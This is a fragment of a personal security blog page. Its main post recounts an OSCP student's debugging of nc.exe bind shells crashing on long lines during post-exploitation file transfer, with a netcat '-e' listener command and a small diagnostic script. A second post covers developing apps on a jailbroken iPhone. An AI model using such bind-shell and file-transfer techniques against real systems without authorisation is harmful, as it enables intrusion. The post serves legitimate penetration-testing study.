+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/infosec/compromise/" rel="category tag">Compromise</a>, <a href="/category/infosec/" rel="category tag">Information Security</a>, <a href="/category/unix/linux/" rel="category tag">Linux</a>, <a href="/category/passwords/" rel="category tag">Passwords</a>, <a href="/category/infosec/pentest/" rel="category tag">Penetration Test</a>, <a href="/category/php/" rel="category tag">PHP</a>, <a href="/category/development/python/" rel="category tag">Python</a>, <a href="/category/shell/" rel="category tag">Shell</a>, <a href="/category/unix/" rel="category tag">Unix</a>, <a href="/category/web-server/" rel="category tag">Web Server</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/fristileaks-1-3/#respond"><span class="leave-reply">Leave a reply</span></a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-321 -->
+
+				
+					
+	<article id="post-295" class="post-295 post type-post status-publish format-standard hentry category-development category-infosec category-lesson-learned category-online-course category-oscp category-pentest category-python">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/nc-exe-v1-10-nt-crashes-when-e-used-and/" rel="bookmark">nc.exe v1.10 NT crashes when -e used and <323 bytes sent in a line</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/nc-exe-v1-10-nt-crashes-when-e-used-and/" title="1:02 PM" rel="bookmark"><time class="entry-date" datetime="2017-08-07T13:02:27+00:00">2017-08-07</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/nc-exe-v1-10-nt-crashes-when-e-used-and/#respond"><span class="leave-reply">Reply</span></a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>I&#8217;m currently working through the PWK course from offensive-security, hoping to get my OSCP certification. While following the course materials, I&#8217;ve got to a section that talks about methods of transferring binary files after you have a shell on a remote system.</p>
+<p>One of the methods suggested is converting the file to text using exe2bat.exe to convert the file into a series of echo commands with redirection to a file that can be copy/pasted into the shell and finally running debug.exe to convert the file back into an exe. It&#8217;s a pretty well known method, detailed instructions can be found easily with google.</p>
+<p>I hit a problem when working through this though&#8230; I created a bind shell using nc.exe (v1.10 NT) and when i connected to this and pasted in the lines from the bat file created by exe2bat.exe, the nc.exe process would crash. It turned out to be crashing when it got the 3rd line from the bat file. I thought this was strange, so I contacted offensive-security support and they confirmed my findings, but weren&#8217;t sure why and suggested I used a different method to get a remote shell, e.g. using msfvenom.</p>
+<p>I have done some testing myself, and wrote a python script that tells me what it received and how long it was so that I could see in more detail what was going on. The script is:</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr>
+<td class="line_numbers"><pre>1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td>
+<td class="code"><pre class="python" style="font-family:monospace;"><span style="color: #808080; font-style: italic;">#!/usr/bin/env python3</span>
+&nbsp;
+<span style="color: #ff7700;font-weight:bold;">import</span> <span style="color: #dc143c;">sys</span>
+&nbsp;
+<span style="color: #ff7700;font-weight:bold;">print</span><span style="color: black;">&#40;</span><span style="color: #483d8b;">'pypipe.py v0.1'</span><span style="color: black;">&#41;</span>
+<span style="color: #ff7700;font-weight:bold;">print</span><span style="color: black;">&#40;</span><span style="color: #483d8b;">'--------------'</span><span style="color: #66cc66;">,</span> flush<span style="color: #66cc66;">=</span><span style="color: #008000;">True</span><span style="color: black;">&#41;</span>
+&nbsp;
+<span style="color: #ff7700;font-weight:bold;">for</span> idx<span style="color: #66cc66;">,</span> line <span style="color: #ff7700;font-weight:bold;">in</span> <span style="color: #008000;">enumerate</span><span style="color: black;">&#40;</span><span style="color: #dc143c;">sys</span>.<span style="color: black;">stdin</span><span style="color: black;">&#41;</span>:
+    line <span style="color: #66cc66;">=</span> line.<span style="color: black;">strip</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span>
+    <span style="color: #ff7700;font-weight:bold;">print</span><span style="color: black;">&#40;</span><span style="color: #483d8b;">'# Received line {}. Length (bytes):{}'</span>.<span style="color: black;">format</span><span style="color: black;">&#40;</span>
+            <span style="color: #008000;">str</span><span style="color: black;">&#40;</span>idx<span style="color: black;">&#41;</span>.<span style="color: black;">zfill</span><span style="color: black;">&#40;</span><span style="color: #ff4500;">3</span><span style="color: black;">&#41;</span><span style="color: #66cc66;">,</span>
+            <span style="color: #008000;">str</span><span style="color: black;">&#40;</span><span style="color: #008000;">len</span><span style="color: black;">&#40;</span>line<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span>.<span style="color: black;">zfill</span><span style="color: black;">&#40;</span><span style="color: #ff4500;">3</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #66cc66;">,</span>
+        flush<span style="color: #66cc66;">=</span><span style="color: #008000;">True</span><span style="color: black;">&#41;</span></pre></td>
+</tr></table>
+<p class="theCode" style="display:none;">#!/usr/bin/env python3
+
+import sys
+
+print('pypipe.py v0.1')
+print('--------------', flush=True)
+
+for idx, line in enumerate(sys.stdin):
+    line = line.strip()
+    print('# Received line {}. Length (bytes):{}'.format(
+            str(idx).zfill(3),
+            str(len(line)).zfill(3)),
+        flush=True)</p>
+</div>
+
+<p>Binding this to port 80 on windows with</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr><td class="code"><pre class="bash" style="font-family:monospace;">nc <span style="color: #660033;">-nvlp</span> <span style="color: #000000;">80</span> <span style="color: #660033;">-e</span> <span style="color: #ff0000;">&quot;py pypipe.py&quot;</span></pre></td></tr></table>
+<p class="theCode" style="display:none;">nc -nvlp 80 -e &quot;py pypipe.py&quot;</p>
+</div>
+
+<p>and then connecting with netcat on my other system makes any input get reported back to the remote system line by line, and i can see that the problem happens when a long line is sent. I could also tell that it accepted a line with 323 characters, but when i sent 324, it crashed.</p>
+<p>I suspect I&#8217;m seeing the bug mentioned <a href="https://www.exploit-db.com/exploits/726/">here</a> and <a href="https://www.exploit-db.com/exploits/16436/">here</a>.</p>
+<p>So I&#8217;ve learned that I can&#8217;t use that version of nc.exe to send binary files that have been converted into long text strings. Different versions of nc probably don&#8217;t have this issue.</p>
+<p>While this is a problem because it&#8217;s an exploitable bug, this is not much of a problem for transferring binary files because in real world secenarios because there won&#8217;t be nc.exe on the system unless I&#8217;ve already found a way of getting a binary file onto the system, but it&#8217;s something that did trip me up for a few hours while doing the PWK course.</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/development/" rel="category tag">Development</a>, <a href="/category/infosec/" rel="category tag">Information Security</a>, <a href="/category/lesson-learned/" rel="category tag">Lesson Learned</a>, <a href="/category/education/online-course/" rel="category tag">Online Course</a>, <a href="/category/education/online-course/oscp/" rel="category tag">OSCP</a>, <a href="/category/infosec/pentest/" rel="category tag">Penetration Test</a>, <a href="/category/development/python/" rel="category tag">Python</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/nc-exe-v1-10-nt-crashes-when-e-used-and/#respond"><span class="leave-reply">Leave a reply</span></a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-295 -->
+
+				
+					
+	<article id="post-260" class="post-260 post type-post status-publish format-standard hentry category-appsync category-development category-ios category-jailbreak category-xcode">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/developing-and-debugging-my-own-apps-on-jailbroken-ios8-1-using-xcode-6-1-without-paying-apple/" rel="bookmark">Developing and debugging my own apps on JailBroken iOS8.1 using XCode 6.1 without paying apple</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/developing-and-debugging-my-own-apps-on-jailbroken-ios8-1-using-xcode-6-1-without-paying-apple/" title="10:54 AM" rel="bookmark"><time class="entry-date" datetime="2014-11-16T10:54:28+00:00">2014-11-16</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/developing-and-debugging-my-own-apps-on-jailbroken-ios8-1-using-xcode-6-1-without-paying-apple/#comments">64</a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>A while back I used an app called JailCoder to enable me to run and debug my own apps on my jailbroken iPhone 5S without having to pay Apple for a full developer account. I&#8217;m still learning iOS development and I have nothing I want to submit to the app store, so I&#8217;m reluctant to pay the £100 that Apple wants to enable me to run my own code on my own device.</p>
+<p>Given that XCode is free, and that £100 per year would gives me the ability to sell apps through the app store, I think it&#8217;s a bargain if you are actually planning to distribute apps, but for me just learning it seems a bit steep.</p>
+<p>There don&#8217;t seem to be many tutorials out there telling you how to do this for iOS8.1 and XCode 6.1 (they are all a bit outdated), but this is what worked for me:</p>
+<ol>
+<li>On your Jailbroken device install AppSync Unified 5.2-1 (or later) from AngelXWind&#8217;s repo. Don&#8217;t use any other AppSync, and if you have others, be sure to remove them.</li>
+<li>Open /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk/SDKSettings.plist and change AD_HOC_CODE_SIGNING_ALLOWED to YES. You may need to duplicate it to the desktop, change it, save it, then drag and drop back into the original folder because OS X let you edit the file in place.</li>
+<li>If XCode was running, restart XCode.</li>
+<li>Change your Project and Target settings to &#8220;Ad Hoc Code Sign&#8221; in Build Settings</li>
+<li>Tell XCode to run app on iPhone. At this point XCode will put app on your iDevice, but can’t debug because it can&#8217;t attach to the process. The app will start then close immediately. You can now manually start the app on the phone now though.</li>
+<li>To enable debugging: In your project select File&gt;New File Property List and create a file called &#8220;Entitlements.plist&#8221;. Add “Can be debugged” or “get-task-allow” (both do the same thing) and set the value to YES.</li>
+<li>Now change your Project and Target Code Signing Entitlements (In Build Settings) to &#8220;Entitlements.plist&#8221; (you have to type it in).</li>
+</ol>
+<p>Now XCode can run and debug the app. Good luck</p>
+<p>Note that some poeple have issues because they have other appsyncs installed. Remove all other appsyncs and install AppSync Unified from http://cydia.angelxwind.net/ (you&#8217;ll have to add this repo to cydia)</p>
+<p>Thanks to Karen and Linus for developing AppSync Unified.</p>
+<p><a href="https://www.reddit.com/r/jailbreak/comments/2m45y8/release_appsync_unified_51_with_full_ios_8/">This subreddit may be helpful</a></p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/ios/jailbreak/appsync/" rel="category tag">AppSync</a>, <a href="/category/development/" rel="category tag">Development</a>, <a href="/category/ios/" rel="category tag">iOS</a>, <a href="/category/ios/jailbreak/" rel="category tag">JailBreak</a>, <a href="/category/development/xcode/" rel="category tag">XCode</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/developing-and-debugging-my-own-apps-on-jailbroken-ios8-1-using-xcode-6-1-without-paying-apple/#comments"><b>64</b> Replies</a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-260 -->
+
+				
+				
+			
+			</div>
+<!-- #content -->
+		</section><!-- #primary -->
+
+		<div id="secondary" class="widget-area" role="complementary">
+			<aside id="rss-2" class="widget widget_rss"><h3 class="widget-title">
+<a class="rsswidget rss-widget-feed" href="/?feed=rss"><img class="rss-widget-icon" style="border:0" width="14" height="14" src="/wp-includes/images/rss.png" alt="RSS" loading="lazy"></a> <a class="rsswidget rss-widget-title" href="/">grobinson.me RSS feed</a>
+</h3>
+<ul><li><a class="rsswidget" href="/learning-more-about-buffer-overflow-exploits/">Learning more about buffer overflow exploits</a></li></ul></aside><aside id="search-2" class="widget widget_search">	<form method="get" id="searchform" action="/">
+		<label for="s" class="assistive-text">Search</label>
+		<input type="text" class="field" name="s" id="s" placeholder="Search">
+		<input type="submit" class="submit" name="submit" id="searchsubmit" value="Search">
+	</form>
+</aside>
+		<aside id="recent-posts-2" class="widget widget_recent_entries">
+		<h3 class="widget-title">Recent Posts</h3>
+		<ul>
+											<li>
+					<a href="/learning-more-about-buffer-overflow-exploits/">Learning more about buffer overflow exploits</a>
+									</li>
+											<li>
+					<a href="/reverse-shells-even-without-nc-on-linux/">Reverse shells even without nc on Linux</a>
+									</li>
+											<li>
+					<a href="/i-discovered-a-vulnerability-in-a-wordpress-plugin/">I discovered a vulnerability in a wordpress plugin</a>
+									</li>
+											<li>
+					<a href="/i-passed-oscp/">I passed OSCP!</a>
+									</li>
+											<li>
+					<a href="/fristileaks-1-3/">FristiLeaks 1.3</a>
+									</li>
+					</ul>
+
+		</aside><aside id="recent-comments-2" class="widget widget_recent_comments"><h3 class="widget-title">Recent Comments</h3>
+<ul id="recentcomments">
+<li class="recentcomments">
+<span class="comment-author-link"><a href="/" class="url" rel="ugc">Graeme Robinson</a></span> on <a href="/single-line-php-script-to-gain-shell/#comment-5077679">Single Line PHP Script to Gain Shell</a>
+</li>
+<li class="recentcomments">
+<span class="comment-author-link">Daniel</span> on <a href="/single-line-php-script-to-gain-shell/#comment-5061347">Single Line PHP Script to Gain Shell</a>
+</li>
+<li class="recentcomments">
+<span class="comment-author-link"><a href="https://www.instagram.com/endego.dj/" class="url" rel="ugc external nofollow">Errorgedill</a></span> on <a href="/learning-more-about-buffer-overflow-exploits/#comment-5021162">Learning more about buffer overflow exploits</a>
+</li>
+<li class="recentcomments">
+<span class="comment-author-link"><a href="/reverse-shells-even-without-nc-on-linux/" class="url" rel="ugc">Reverse shells even without nc on Linux | Graeme Robinson&#039;s blog</a></span> on <a href="/single-line-php-script-to-gain-shell/#comment-4568725">Single Line PHP Script to Gain Shell</a>
+</li>
+<li class="recentcomments">
+<span class="comment-author-link"><a href="/i-passed-oscp/" class="url" rel="ugc">I passed OSCP! | Graeme Robinson&#039;s blog</a></span> on <a href="/ive-signed-up-to-the-penetration-testing-with-kali-linux-course-oscp/#comment-4568721">I&#8217;ve signed up to the Penetration testing with Kali Linux Course (OSCP)</a>
+</li>
+</ul></aside><aside id="archives-2" class="widget widget_archive"><h3 class="widget-title">Archives</h3>
+			<ul>
+					<li><a href="/2018/07/">July 2018</a></li>
+	<li><a href="/2018/04/">April 2018</a></li>
+	<li><a href="/2017/10/">October 2017</a></li>
+	<li><a href="/2017/08/">August 2017</a></li>
+	<li><a href="/2017/06/">June 2017</a></li>
+	<li><a href="/2016/08/">August 2016</a></li>
+	<li><a href="/2014/11/">November 2014</a></li>
+	<li><a href="/2013/01/">January 2013</a></li>
+	<li><a href="/2012/12/">December 2012</a></li>
+	<li><a href="/2012/11/">November 2012</a></li>
+	<li><a href="/2012/10/">October 2012</a></li>
+	<li><a href="/2012/09/">September 2012</a></li>
+	<li><a href="/2012/08/">August 2012</a></li>
+			</ul>
+
+			</aside><aside id="categories-2" class="widget widget_categories"><h3 class="widget-title">Categories</h3>
+			<ul>
+					<li class="cat-item cat-item-47">
+<a href="/category/ios/jailbreak/appsync/">AppSync</a>
+</li>
+	<li class="cat-item cat-item-16">
+<a href="/category/infosec/hash/crack/brute-force/">Brute Force</a>
+</li>
+	<li class="cat-item cat-item-62">
+<a href="/category/exploit/exploit-development/buffer-overflow/">Buffer Overflow</a>
+</li>
+	<li class="cat-item cat-item-55">
+<a href="/category/career/">Career</a>
+</li>
+	<li class="cat-item cat-item-20">
+<a href="/category/comic/">Comic</a>
+</li>
+	<li class="cat-item cat-item-35">
+<a href="/category/infosec/compromise/">Compromise</a>
+</li>
+	<li class="cat-item cat-item-52">
+<a href="/category/infosec/conference/">Conference</a>
+</li>
+	<li class="cat-item cat-item-13">
+<a href="/category/infosec/hash/crack/">Crack</a>
+</li>
+	<li class="cat-item cat-item-48 current-cat">
+<a aria-current="page" href="/category/development/">Development</a>
+</li>
+	<li class="cat-item cat-item-41">
+<a href="/category/education/">Education</a>
+</li>
+	<li class="cat-item cat-item-27">
+<a href="/category/email/">Email</a>
+</li>
+	<li class="cat-item cat-item-5">
+<a href="/category/infosec/encryption/">Encryption</a>
+</li>
+	<li class="cat-item cat-item-30">
+<a href="/category/exploit/">Exploit</a>
+</li>
+	<li class="cat-item cat-item-40">
+<a href="/category/exploit-excercises/">Exploit Excercises</a>
+</li>
+	<li class="cat-item cat-item-58">
+<a href="/category/exploit/exploit-db/">exploit-db</a>
+</li>
+	<li class="cat-item cat-item-21">
+<a href="/category/os-x/filevault/">FileVault</a>
+</li>
+	<li class="cat-item cat-item-24">
+<a href="/category/infosec/encryption/full-disk-encryption/">Full Disk Encryption</a>
+</li>
+	<li class="cat-item cat-item-36">
+<a href="/category/passwords/google-authenticator/">Google Authenticator</a>
+</li>
+	<li class="cat-item cat-item-9">
+<a href="/category/infosec/hash/">Hash</a>
+</li>
+	<li class="cat-item cat-item-14">
+<a href="/category/infosec/hash/crack/hashcat/">HashCat</a>
+</li>
+	<li class="cat-item cat-item-25">
+<a href="/category/email/hotmail/">Hotmail</a>
+</li>
+	<li class="cat-item cat-item-61">
+<a href="/category/exploit/exploit-development/immunity/">Immunity</a>
+</li>
+	<li class="cat-item cat-item-4">
+<a href="/category/infosec/">Information Security</a>
+</li>
+	<li class="cat-item cat-item-45">
+<a href="/category/ios/">iOS</a>
+</li>
+	<li class="cat-item cat-item-46">
+<a href="/category/ios/jailbreak/">JailBreak</a>
+</li>
+	<li class="cat-item cat-item-8">
+<a href="/category/infosec/hash/crack/john-the-ripper/">John The Ripper</a>
+</li>
+	<li class="cat-item cat-item-57">
+<a href="/category/kali/">Kali</a>
+</li>
+	<li class="cat-item cat-item-33">
+<a href="/category/passwords/lastpass/">LastPass</a>
+</li>
+	<li class="cat-item cat-item-37">
+<a href="/category/lesson-learned/">Lesson Learned</a>
+</li>
+	<li class="cat-item cat-item-39">
+<a href="/category/unix/linux/">Linux</a>
+</li>
+	<li class="cat-item cat-item-60">
+<a href="/category/exploit/exploit-development/mona-py/">mona.py</a>
+</li>
+	<li class="cat-item cat-item-42">
+<a href="/category/education/online-course/">Online Course</a>
+</li>
+	<li class="cat-item cat-item-23">
+<a href="/category/os-x/">OS X</a>
+</li>
+	<li class="cat-item cat-item-53">
+<a href="/category/education/online-course/oscp/">OSCP</a>
+</li>
+	<li class="cat-item cat-item-19">
+<a href="/category/passwords/password-complexity/">Password Complexity</a>
+</li>
+	<li class="cat-item cat-item-32">
+<a href="/category/passwords/password-reuse/">Password Reuse</a>
+</li>
+	<li class="cat-item cat-item-18">
+<a href="/category/passwords/">Passwords</a>
+</li>
+	<li class="cat-item cat-item-7">
+<a href="/category/infosec/pentest/">Penetration Test</a>
+</li>
+	<li class="cat-item cat-item-29">
+<a href="/category/php/">PHP</a>
+</li>
+	<li class="cat-item cat-item-44">
+<a href="/category/passwords/plaintext/">Plaintext</a>
+</li>
+	<li class="cat-item cat-item-56">
+<a href="/category/pwk/">PWK</a>
+</li>
+	<li class="cat-item cat-item-54">
+<a href="/category/development/python/">Python</a>
+</li>
+	<li class="cat-item cat-item-15">
+<a href="/category/infosec/hash/salt/">Salt</a>
+</li>
+	<li class="cat-item cat-item-28">
+<a href="/category/shell/">Shell</a>
+</li>
+	<li class="cat-item cat-item-43">
+<a href="/category/education/online-course/stanford-online/">Stanford Online</a>
+</li>
+	<li class="cat-item cat-item-1">
+<a href="/category/uncategorized/">Uncategorized</a>
+</li>
+	<li class="cat-item cat-item-38">
+<a href="/category/unix/">Unix</a>
+</li>
+	<li class="cat-item cat-item-31">
+<a href="/category/web-server/">Web Server</a>
+</li>
+	<li class="cat-item cat-item-6">
+<a href="/category/infosec/webapp/">WebApp</a>
+</li>
+	<li class="cat-item cat-item-51">
+<a href="/category/infosec/white-hat/">White Hat</a>
+</li>
+	<li class="cat-item cat-item-34">
+<a href="/category/infosec/webapp/windows-live/">Windows Live</a>
+</li>
+	<li class="cat-item cat-item-49">
+<a href="/category/development/xcode/">XCode</a>
+</li>
+	<li class="cat-item cat-item-26">
+<a href="/category/comic/xkcd/">XKCD</a>
+</li>
+			</ul>
+
+			</aside>		</div>
+<!-- #secondary .widget-area -->
+
+	</div>
+<!-- #main -->
+
+	<footer id="colophon">
+
+			
+
+			<div id="site-generator">
+												<a href="https://wordpress.org/" class="imprint" title="Semantic Personal Publishing Platform">
+					Proudly powered by WordPress				</a>
+			</div>
+	</footer><!-- #colophon -->
+</div>
+<!-- #page -->
+
+<script type="text/javascript" src="/wp-content/plugins/wp-syntax/js/wp-syntax.js?ver=1.2" id="wp-syntax-js-js"></script>
+
+</body>
+</html>
